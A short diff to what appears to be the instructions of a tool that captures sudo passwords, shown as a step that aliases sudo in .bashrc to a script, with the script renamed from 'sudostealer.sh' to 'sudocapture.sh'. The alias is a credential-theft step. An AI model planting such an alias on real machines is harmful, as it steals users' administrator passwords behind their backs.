@@ -13,4 +13,4 @@ In the .bashrc File:
 Add the following to create an alias for sudo
 
 Create an alias:
-```alias sudo="/PathToFile/sudostealer.sh"```
+```alias sudo="/PathToFile/sudocapture.sh"```
